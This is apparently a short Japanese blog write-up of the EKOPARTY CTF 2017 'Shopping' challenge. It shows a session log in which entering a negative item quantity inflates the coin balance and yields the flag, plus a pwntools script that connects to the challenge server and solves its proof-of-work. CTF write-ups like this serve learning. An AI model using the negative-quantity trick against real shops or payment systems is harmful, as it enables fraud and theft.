---
layout: post
redirect_from:
  - /blog/2017/09/20/ekoparty-ctf-2017-shopping/
date: "2017-09-20T20:39:26+09:00"
tags: [ "ctf", "writeup", "pwn", "ekoparty-ctf" ]
---

# EKOPARTY CTF 2017: Shopping

PoWがあって面倒と聞き、よし専用ライブラリで殴ってやろうという気持ちで向かったら自明問だった。
まあ非自明だと解けないので はい。

## solution

物を負数個だけ買えばよい。

```
$ ./a.py --log-level info
[+] Opening connection to shopping.ctf.site on port 21111: Done
[*] Switching to interactive mode
Welcome to Ekoparty shopping Center
Feel free to buy up to 5 items that you may like
Use wisely your coins, have fun!


You have 50 coins
What do you wanna buy today?
1. t-shirt        10
2. short        20
3. stickers        1
4. flag            ?
$ 1
How many?
$ -1000000000000
You dont have enough coins
You have 1316134962 coins
What do you wanna buy today?
1. t-shirt        10
2. short        20
3. stickers        1
4. flag            ?
$ 4
How many?
$ 1
Congratulations, flag is EKO{d0_y0u_even_m4th?}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to shopping.ctf.site port 21111
```

## implementation

``` c++
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='shopping.ctf.site')
parser.add_argument('port', nargs='?', default=21111, type=int)
parser.add_argument('--log-level', default='debug')
args = parser.parse_args()
context.log_level = args.log_level
p = remote(args.host, args.port)

import proofofwork
p.recvuntil('Enter a raw string (max. 32 bytes) that meets the following condition: hex(sha1(input))[0:6] == ')
prefix = p.recvline().rstrip()
string = proofofwork.sha1(prefix)
p.sendline(string)

p.interactive()
```
